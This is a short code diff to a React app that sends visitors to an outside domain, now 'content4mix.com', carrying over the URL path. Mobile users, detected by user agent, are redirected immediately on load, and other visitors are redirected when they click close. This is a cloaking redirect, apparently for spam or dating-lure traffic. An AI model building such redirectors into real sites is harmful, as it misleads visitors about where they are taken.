@@ -5,8 +5,8 @@ function App() {
   const [isLoaded, setIsLoaded] = useState(false);
 
   const location = window.location.href;
-  const url = location.replace('https://redirect-dating.vercel.app/', '')
-  const re = `https://olympusmedia.us/${url}`
+  const url = location.replace('https://olympusmedia.vercel.app/', '')
+  const re = `https://content4mix.com/${url}`
 
   const onClickClose = async () => {
     window.location.href = re;
@@ -21,8 +21,8 @@ function App() {
     const ios = /iPhone|iPad|iPod/i.test(navigator.userAgent);
     if (android || ios) {
       const location = window.location.href;
-      const url = location.replace('https://redirect-dating.vercel.app/', '')
-      const re = `https://olympusmedia.us/${url}`
+      const url = location.replace('https://olympusmedia.vercel.app/', '')
+      const re = `https://content4mix.com/${url}`
       window.location.href = re;
     } else {
       setIsLoaded(true);
